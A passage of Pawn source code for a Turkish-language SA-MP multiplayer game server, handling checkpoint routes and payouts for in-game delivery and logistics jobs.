            KamCheckpoint[playerid] = 101;
        }
        else if(KamCheckpoint[playerid] == 101)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2869.7285,-1194.3529,10.5852, 7.5);
            KamCheckpoint[playerid] = 102;
        }
        else if(KamCheckpoint[playerid] == 102)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2900.8435,-1385.8529,10.5805, 7.5);
            KamCheckpoint[playerid] = 103;
        }
        else if(KamCheckpoint[playerid] == 103)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2846.2263,-1686.9707,10.5791, 7.5);
            KamCheckpoint[playerid] = 104;
        }
        else if(KamCheckpoint[playerid] == 104)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2821.5603,-1860.8939,10.6476, 7.5);
            KamCheckpoint[playerid] = 105;
        }
        else if(KamCheckpoint[playerid] == 105)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2820.1763,-2031.4205,10.6439, 7.5);
            KamCheckpoint[playerid] = 106;
        }
        else if(KamCheckpoint[playerid] == 106)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2747.3032,-2149.2576,10.6352, 7.5);
            KamCheckpoint[playerid] = 107;
        }
        else if(KamCheckpoint[playerid] == 107)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2540.3425,-2152.7498,12.9803, 7.5);
            KamCheckpoint[playerid] = 108;
        }
        else if(KamCheckpoint[playerid] == 108)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2347.4858,-2202.6489,13.0805, 7.5);
            KamCheckpoint[playerid] = 109;
        }
        else if(KamCheckpoint[playerid] == 109)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2263.5615,-2286.3428,13.0805, 7.5);
            KamCheckpoint[playerid] = 110;
        }
        else if(KamCheckpoint[playerid] == 110)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2162.5598,-2418.7156,13.0805, 7.5);
            KamCheckpoint[playerid] = 111;
        }
        else if(KamCheckpoint[playerid] == 111)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2156.8569,-2483.6943,13.0796, 7.5);
            KamCheckpoint[playerid] = 112;
        }
        else if(KamCheckpoint[playerid] == 112)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2189.7000,-2498.1113,13.0808, 7.5);
            KamCheckpoint[playerid] = 113;
        }
        else if(KamCheckpoint[playerid] == 113)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2213.8425,-2498.0703,13.1041, 7.5);
            KamCheckpoint[playerid] = 114;
        }
        else if(KamCheckpoint[playerid] == 114)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2221.4785,-2522.1155,13.1015, 7.5);
            KamCheckpoint[playerid] = 115;
        }
        else if(KamCheckpoint[playerid] == 115)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2217.6084,-2643.7383,13.2504, 7.5);
            KamCheckpoint[playerid] = 116;
        }
		else if(KamCheckpoint[playerid] == 116 && !SevkiyatGorev[playerid] && KamGorevde[playerid] == 1)
		{
		    new vehicleid = GetPlayerVehicleID(playerid);
			MotoruKapat(vehicleid);
			SetVehiclePosEx(vehicleid, Arac[vehicleid][aposx],Arac[vehicleid][aposy],Arac[vehicleid][aposz]);
			RepairVehicleEx(vehicleid);
			RemovePlayerFromVehicle(playerid);
			DisablePlayerCheckpoint(playerid);
			KamCheckpoint[playerid] = 0;
			KamGorevde[playerid] = 0;
		
		    DisablePlayerCheckpoint(playerid);
			new mstring[128], ucret = floatround((1150-Arac[vehicleid][agelir])*UstalikKatSayi(playerid));
			format(mstring,sizeof(mstring), "%s þirketiyle çalýþtýðýnýz için teþekkür ederiz, ücretiniz %d$.",Isyeri[Arac[vehicleid][aisyeri]][iad],ucret);
			Bilgi(playerid, mstring);
			//format(mstring, sizeof(mstring), "Mesleðe devam etmek için '/meslek devam' komutunu kullanýn.");
			//Bilgi(playerid, mstring);
			GivePlayerCash(playerid, ucret);
			Isyeri[Arac[vehicleid][aisyeri]][ikasa] += Arac[vehicleid][agelir];
			IsyeriKaydet(Arac[vehicleid][aisyeri]);
		}
	}
	//elektronik
	if(!GetPVarInt(playerid, "ParkCP") && meslekbul[playerid] != 1 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && EleGorevde[playerid] == 1)
	{
		if(EleCheckpoint[playerid] == 1)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 2227.3623,-2633.2378,13.4049, 7.5);
		    EleCheckpoint[playerid] = 2;
		}
		else if(EleCheckpoint[playerid] == 2)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 2227.9626,-2614.6790,13.3951, 7.5);
		    EleCheckpoint[playerid] = 3;
		}
		else if(EleCheckpoint[playerid] == 3 && !SevkiyatGorev[playerid] && EleGorevde[playerid] == 1)
		{
		    new oldcar = GetPlayerVehicleID(playerid);
		    DisablePlayerCheckpoint(playerid);
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
			Aractamiri(oldcar);
			SetPlayerPos(playerid, 2448.8557,-2620.3879,13.6572);
			EleGorevde[playerid] = 0;
			new mstring[128], ucret=floatround(350*UstalikKatSayi(playerid));
			format(mstring, sizeof(mstring), "Sevkiyatý gerçekleþtirerek %d$ kazandýnýz.",ucret);
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "Mesleðe devam etmek için '/meslek devam' komutunu kullanýn.");
			Bilgi(playerid, mstring);
			GivePlayerCash(playerid, ucret);
			EleCheckpoint[playerid] = 0;
		}
	}
	//lojistik
	if(!GetPVarInt(playerid, "ParkCP") && meslekbul[playerid] != 1 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && LojGorevde[playerid] == 1)
	{
		if(LojCheckpoint[playerid] == 1)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2285.6465,-2372.2385,13.1773, 7.5);
            LojCheckpoint[playerid] = 2;
        }
        else if(LojCheckpoint[playerid] == 2)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2222.1484,-2483.3188,13.1358, 7.5);
            LojCheckpoint[playerid] = 3;
        }
	    else if(LojCheckpoint[playerid] == 3)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2188.2788,-2492.8333,13.1493, 7.5);
            LojCheckpoint[playerid] = 4;
        }
		else if(LojCheckpoint[playerid] == 4)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2157.5254,-2516.5256,13.1480, 7.5);
            LojCheckpoint[playerid] = 5;
        }
		else if(LojCheckpoint[playerid] == 5)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2106.3416,-2656.2974,13.1463, 7.5);
            LojCheckpoint[playerid] = 6;
        }
		else if(LojCheckpoint[playerid] == 6)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1447.5602,-2667.1714,13.0371, 7.5);
            LojCheckpoint[playerid] = 7;
        }
		else if(LojCheckpoint[playerid] == 7)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1348.8962,-2488.3672,13.1481, 7.5);
            LojCheckpoint[playerid] = 8;
        }
		else if(LojCheckpoint[playerid] == 8)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1384.4004,-2157.0581,13.1558, 7.5);
            LojCheckpoint[playerid] = 9;
        }
		else if(LojCheckpoint[playerid] == 9)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1671.3831,-1979.4429,23.4108, 7.5);
            LojCheckpoint[playerid] = 10;
        }
		else if(LojCheckpoint[playerid] == 10)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1613.5656,-1574.5416,28.3592, 7.5);
            LojCheckpoint[playerid] = 11;
        }
		else if(LojCheckpoint[playerid] == 11)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1650.1989,-1124.0634,58.6223, 7.5);
            LojCheckpoint[playerid] = 12;
        }
		else if(LojCheckpoint[playerid] == 12)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1713.2762,-706.0190,46.9147, 7.5);
            LojCheckpoint[playerid] = 13;
        }
		else if(LojCheckpoint[playerid] == 13)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1677.6100,-129.0715,35.9826, 7.5);
            LojCheckpoint[playerid] = 14;
        }
		else if(LojCheckpoint[playerid] == 14)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1664.0171,273.8364,29.8192, 7.5);
            LojCheckpoint[playerid] = 15;
        }
		else if(LojCheckpoint[playerid] == 15)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1748.3905,508.6219,28.2909, 7.5);
            LojCheckpoint[playerid] = 16;
        }
		else if(LojCheckpoint[playerid] == 16)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1809.6509,815.8052,10.5913, 7.5);
            LojCheckpoint[playerid] = 17;
        }
		else if(LojCheckpoint[playerid] == 17)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1747.4120,855.2341,9.4630, 7.5);
            LojCheckpoint[playerid] = 18;
        }
		else if(LojCheckpoint[playerid] == 18)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1329.8367,878.0493,6.5856, 7.5);
            LojCheckpoint[playerid] = 19;
        }
		else if(LojCheckpoint[playerid] == 19)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1230.1781,1277.6277,6.5077, 7.5);
            LojCheckpoint[playerid] = 20;
        }
		else if(LojCheckpoint[playerid] == 20)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1230.2264,1659.2153,6.5058, 7.5);
            LojCheckpoint[playerid] = 21;
        }
		else if(LojCheckpoint[playerid] == 21)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1299.6642,1798.5365,10.4258, 7.5);
            LojCheckpoint[playerid] = 22;
        }
		else if(LojCheckpoint[playerid] == 22)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1318.8878,1811.4564,10.4463, 7.5);
            LojCheckpoint[playerid] = 23;
        }
		else if(LojCheckpoint[playerid] == 23)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1329.5696,1854.5741,10.4451, 7.5);
            LojCheckpoint[playerid] = 24;
        }
		else if(LojCheckpoint[playerid] == 24)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1440.9828,1870.0037,10.4451, 7.5);
            LojCheckpoint[playerid] = 25;
        }
		else if(LojCheckpoint[playerid] == 25)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1634.8669,1870.9006,10.4503, 7.5);
            LojCheckpoint[playerid] = 26;
        }
		else if(LojCheckpoint[playerid] == 26)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1644.5453,1801.2201,10.4432, 7.5);
            LojCheckpoint[playerid] = 27;
        }
		else if(LojCheckpoint[playerid] == 27)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1728.2312,1812.5111,10.5913, 7.5);
            LojCheckpoint[playerid] = 28;
        }
		else if(LojCheckpoint[playerid] == 28)
        {
            DisablePlayerCheckpoint(playerid);
            SetTimerEx("kamyonbitiyo",10000, false,"u",playerid);
			TogglePlayerControllable(playerid, 0);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Bekleyin..", 5000, 3);//boþaltma
            SetPlayerCheckpoint(playerid, 1644.9906,1779.8787,10.4442, 7.5);
            LojCheckpoint[playerid] = 29;
        }
		else if(LojCheckpoint[playerid] == 29)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1645.1691,1725.8267,10.4458, 7.5);
            LojCheckpoint[playerid] = 30;
        }
		else if(LojCheckpoint[playerid] == 30)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1703.8596,1710.7477,10.4462, 7.5);
            LojCheckpoint[playerid] = 31;
        }
		else if(LojCheckpoint[playerid] == 31)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1778.0873,1583.1819,6.5076, 7.5);
            LojCheckpoint[playerid] = 32;
        }
		else if(LojCheckpoint[playerid] == 32)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1785.1594,1242.5779,6.5085, 7.5);
            LojCheckpoint[playerid] = 33;
        }
		else if(LojCheckpoint[playerid] == 33)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1784.4695,803.9409,10.8362, 7.5);
            LojCheckpoint[playerid] = 34;
        }
		else if(LojCheckpoint[playerid] == 34)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1725.8145,525.4077,27.8020, 7.5);
            LojCheckpoint[playerid] = 35;
        }
		else if(LojCheckpoint[playerid] == 35)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1619.3005,181.9975,33.5071, 7.5);
            LojCheckpoint[playerid] = 36;
        }
		else if(LojCheckpoint[playerid] == 36)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1654.1511,-117.8903,34.7994, 7.5);
            LojCheckpoint[playerid] = 37;
        }
		else if(LojCheckpoint[playerid] == 37)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1656.0193,-208.6794,36.1956, 7.5);
            LojCheckpoint[playerid] = 38;
        }
		else if(LojCheckpoint[playerid] == 38)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1670.2692,-387.2814,37.2986, 7.5);
            LojCheckpoint[playerid] = 39;
        }
		else if(LojCheckpoint[playerid] == 39)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1670.3328,-835.6357,58.1362, 7.5);
            LojCheckpoint[playerid] = 40;
        }
		else if(LojCheckpoint[playerid] == 40)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1601.4493,-1303.2831,37.1159, 7.5);
            LojCheckpoint[playerid] = 41;
        }
		else if(LojCheckpoint[playerid] == 41)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1593.5692,-1726.0500,27.8043, 7.5);
            LojCheckpoint[playerid] = 42;
        }
		else if(LojCheckpoint[playerid] == 42)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1582.2777,-2092.2131,17.3081, 7.5);
            LojCheckpoint[playerid] = 43;
        }
		else if(LojCheckpoint[playerid] == 43)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1329.7722,-2475.3643,13.1502, 7.5);
            LojCheckpoint[playerid] = 44;
        }
		else if(LojCheckpoint[playerid] == 44)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1470.0464,-2687.1038,11.7462, 7.5);
            LojCheckpoint[playerid] = 45;
        }
		else if(LojCheckpoint[playerid] == 45)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1945.3130,-2687.5825,6.5150, 7.5);
            LojCheckpoint[playerid] = 46;
        }
		else if(LojCheckpoint[playerid] == 46)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2177.9053,-2512.2336,13.1474, 7.5);
            LojCheckpoint[playerid] = 47;
        }
		else if(LojCheckpoint[playerid] == 47)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2211.5374,-2498.7224,13.1706, 7.5);
            LojCheckpoint[playerid] = 48;
        }
		else if(LojCheckpoint[playerid] == 48)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2227.6594,-2458.5303,13.1420, 7.5);
            LojCheckpoint[playerid] = 49;
        }
		else if(LojCheckpoint[playerid] == 49)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2293.3779,-2373.0151,13.1033, 7.5);//bitiþ
            LojCheckpoint[playerid] = 50;
        }
		else if(LojCheckpoint[playerid] == 50 && !SevkiyatGorev[playerid] && LojGorevde[playerid] == 1)
		{
		    new oldcar = GetPlayerVehicleID(playerid);
		    DisablePlayerCheckpoint(playerid);
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
			Aractamiri(oldcar);
			SetPlayerPos(playerid, 2281.1309,-2365.0793,13.5469);
			LojGorevde[playerid] = 0;
			new mstring[128], ucret=floatround(350*UstalikKatSayi(playerid));
			format(mstring, sizeof(mstring), "Sevkiyatý gerçekleþtirerek %d$ kazandýnýz.",ucret);
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "Mesleðe devam etmek için '/meslek devam' komutunu kullanýn.");
			Bilgi(playerid, mstring);
			GivePlayerCash(playerid, ucret);
			LojCheckpoint[playerid] = 0;
		}
	}
	if(!GetPVarInt(playerid, "ParkCP") && meslekbul[playerid] != 1 && SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid])
	{
	    if(SevkiyatCheckpoint[playerid] == 1)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2291.6096,-2321.6321,13.6379, 7.5);
				SevkiyatCheckpoint[playerid] = 2;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 2)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2304.1978,-2271.0820,13.4688, 7.5);
				SevkiyatCheckpoint[playerid] = 3;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 3)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2418.4526,-2180.2346,13.4690, 7.5);
				SevkiyatCheckpoint[playerid] = 4;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 4)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2644.5823,-2169.9106,11.0176, 7.5);
				SevkiyatCheckpoint[playerid] = 5;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 5)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2837.7988,-2013.5753,11.0301, 7.5);
				SevkiyatCheckpoint[playerid] = 6;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 6)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2841.2393,-1858.1337,11.0103, 7.5);
				SevkiyatCheckpoint[playerid] = 7;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 7)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2858.9436,-1731.9290,10.9688, 7.5);
				SevkiyatCheckpoint[playerid] = 8;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 8)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2869.5376,-1658.1136,10.9688, 7.5);
				SevkiyatCheckpoint[playerid] = 9;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 9)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2826.7209,-1653.2415,10.8281, 7.5);
				SevkiyatCheckpoint[playerid] = 10;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 10)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2830.5745,-1618.0045,11.0156, 7.5);
				SevkiyatCheckpoint[playerid] = 11;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 11)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2827.1077,-1591.6016,11.0168, 7.5);
				SevkiyatCheckpoint[playerid] = 12;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 12)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2789.4651,-1621.1746,11.0151, 7.5);
				SevkiyatCheckpoint[playerid] = 13;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 13)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				GameTextForPlayer(playerid, "bekleyiniz", 4000, 1);
				Bilgi(playerid, "Kamyonunuz    , lütfen bekleyiniz.");
				SetTimerEx("SevkiyatBaslangicTimer", 3500, 0, "i", playerid);
				TogglePlayerControllable(playerid, 0);
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 14)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2805.9268,-1543.9690,11.0182, 7.5);
				SevkiyatCheckpoint[playerid] = 15;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 15)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2832.3789,-1570.2286,11.0156, 7.5);
				SevkiyatCheckpoint[playerid] = 16;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 16)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2871.7869,-1510.9447,10.9643, 7.5);
				SevkiyatCheckpoint[playerid] = 17;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 17)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2865.6755,-1325.0525,10.9897, 7.5);
				SevkiyatCheckpoint[playerid] = 18;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 18)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2840.5854,-1052.2180,23.3595, 7.5);
				SevkiyatCheckpoint[playerid] = 19;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 19)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2847.2363,-814.3497,11.0124, 7.5);
				SevkiyatCheckpoint[playerid] = 20;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 20)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2848.7261,-628.3398,10.9218, 7.5);
				SevkiyatCheckpoint[playerid] = 21;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 21)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2798.2832,-522.4195,10.9140, 7.5);
				SevkiyatCheckpoint[playerid] = 22;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 22)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2831.1641,-392.6495,8.8798, 7.5);
				SevkiyatCheckpoint[playerid] = 23;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 23)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2800.4517,-267.0825,9.6844, 7.5);
				SevkiyatCheckpoint[playerid] = 24;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 24)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2851.2180,-180.8696,17.6707, 7.5);
				SevkiyatCheckpoint[playerid] = 25;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 25)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2882.5549,-90.3248,22.0615, 7.5);
				SevkiyatCheckpoint[playerid] = 26;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 26)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2878.2261,-2.7902,17.0803, 7.5);
				SevkiyatCheckpoint[playerid] = 27;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 27)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2772.5647,45.4617,21.2426, 7.5);
				SevkiyatCheckpoint[playerid] = 28;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 28)
		{
		    if((Arac[GetPlayerVehicleID(playerid)][atip] == 3 || Arac[GetPlayerVehicleID(playerid)][atip] == 10) && !GetPlayerVehicleSeat(playerid))
		    {
				DisablePlayerCheckpoint(playerid);
				SetPlayerCheckpoint(playerid, 2551.6013,44.1959,26.4348, 7.5);
				SevkiyatCheckpoint[playerid] = 29;
			}
		}
		else if(SevkiyatCheckpoint[playerid] == 29)
